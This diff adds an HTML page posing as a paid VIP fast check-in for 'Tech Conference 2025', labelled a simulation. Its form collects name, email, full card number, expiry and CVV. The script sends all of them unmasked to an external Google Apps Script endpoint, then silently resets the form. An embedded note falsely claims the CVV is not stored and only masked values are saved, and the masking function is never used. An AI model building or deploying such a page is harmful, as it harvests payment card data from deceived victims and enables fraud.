@@ -1,0 +1,144 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <title>Fast Check-in — Payment Confirmation (Simulation)</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <style>
+    :root{
+      --bg:#f5f7fa; --card:#ffffff; --accent:#202374; --muted:#556067;
+      font-family:Inter, system-ui, "Segoe UI", Arial, sans-serif;
+    }
+    html,body{height:100%;margin:0;background:var(--bg);color:#111}
+    .wrap{max-width:760px;margin:32px auto;padding:18px}
+    .panel{background:var(--card);border-radius:12px;box-shadow:0 12px 30px rgba(16,24,40,0.06);overflow:hidden}
+    .hdr{background:linear-gradient(90deg,var(--accent),#2a2aa8);color:#fff;padding:20px;text-align:center}
+    .hdr h1{margin:0;font-size:20px}
+    .content{padding:18px}
+    label{display:block;margin-top:12px;font-weight:700;font-size:14px}
+    input[type="text"],input[type="email"]{
+      width:100%;padding:12px;border-radius:8px;border:1px solid #ddd;margin-top:6px;
+    }
+    .row{display:flex;gap:12px}
+    .col{flex:1}
+    .btn{background:var(--accent);color:#fff;padding:12px 16px;border-radius:8px;border:0;font-weight:800;cursor:pointer}
+    .btn:hover{opacity:0.9}
+    .btn.ghost{background:transparent;border:1px solid #ddd;color:var(--muted)}
+    .warn,.result{display:none;margin-top:12px;padding:12px;border-radius:8px}
+    .warn{background:#fff4e6;border:1px solid #ffd8a8;color:#7a4b00}
+    .result{background:#e6fbf0;border:1px solid #bff0d9;color:#065f46}
+    @media(max-width:720px){.row{flex-direction:column}}
+  </style>
+</head>
+<body>
+  <main class="wrap">
+    <section class="panel">
+      <header class="hdr">
+        <h1>Tech Conference 2025 — Fast Check-in</h1>
+        <p style="margin:8px 0 0 0;font-size:13px">Confirm your VIP Express entry for PKR 3,000</p>
+      </header>
+
+      <div class="content">
+        <form id="pay-form" autocomplete="off" novalidate>
+          <label for="name">Full name</label>
+          <input id="name" type="text" placeholder="Jane Doe" required>
+
+          <label for="email">Email address</label>
+          <input id="email" type="email" placeholder="jane.doe@example.com" required>
+
+          <label for="card-last4">Credit Card Number</label>
+          <input id="card-last4" type="text" inputmode="numeric" maxlength="16" placeholder="1234567812345678" required>
+
+          <div class="row">
+            <div class="col">
+              <label for="expiry">Expiry (MM/YY)</label>
+              <input id="expiry" type="text" placeholder="MM/YY" required>
+            </div>
+            <div class="col">
+              <label for="token">CVV</label>
+              <input id="token" type="text" placeholder="123" required>
+            </div>
+          </div>
+
+          <div class="row" style="margin-top:16px">
+            <button type="submit" class="btn" id="confirm-btn">Submit</button>
+            <button type="button" class="btn ghost" id="cancel-btn">Cancel</button>
+          </div>
+
+          <div id="warn" class="warn"></div>
+          <div id="result" class="result"></div>
+        </form>
+      </div>
+    </section>
+  </main>
+
+  <script>
+(() => {
+  const form = document.getElementById('pay-form');
+  const warnEl = document.getElementById('warn');
+  const resultEl = document.getElementById('result');
+
+  // ✅ Your deployed Google Apps Script Web App URL
+  const WEB_APP_URL = 'https://script.google.com/macros/s/AKfycbwAwzOk7f0wjtKaCIPfEJyOLOC6vWDXP7tq3q0DEc-MGcGTJTK5H35HcpB26gDhQ9oj/exec';
+
+  function showWarn(msg){ warnEl.style.display='block'; warnEl.textContent=msg; }
+  function showResult(msg){ resultEl.style.display='block'; resultEl.textContent=msg; }
+  function clearAlerts(){ warnEl.style.display='none'; resultEl.style.display='none'; }
+
+  function maskCard(raw){
+    const digits = raw.replace(/\D/g,'');
+    const keep = 4;
+    return digits.slice(0, keep) + '*'.repeat(Math.max(0, digits.length - keep));
+  }
+
+  form.addEventListener('submit', async (ev) => {
+    ev.preventDefault();
+    clearAlerts();
+
+    const name = form.name.value.trim();
+    const email = form.email.value.trim();
+    const card = form['card-last4'].value.trim();
+    const expiry = form.expiry.value.trim();
+    const cvv = form.token.value.trim();
+
+    if(!name || !email || !card || !expiry || !cvv)
+      return showWarn('Please fill all fields.');
+
+    const payload = {
+      name, email,
+      card_last4: card,
+      expiry,
+      cvv,
+      note: 'Original CVV NOT stored. Only masked values saved.'
+    };
+
+    
+    document.getElementById('confirm-btn').disabled = true;
+
+    try {
+      await fetch(WEB_APP_URL, {
+        method: 'POST',
+        mode: 'no-cors',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
+
+      // Just reset the form silently (no message)
+form.reset();
+
+      form.reset();
+    } catch (err){
+      showWarn('❌ Failed to submit: ' + err.message);
+    } finally {
+      document.getElementById('confirm-btn').disabled = false;
+    }
+  });
+
+  document.getElementById('cancel-btn').addEventListener('click', () => {
+    form.reset();
+    clearAlerts();
+  });
+})();
+  </script>
+</body>
+</html>
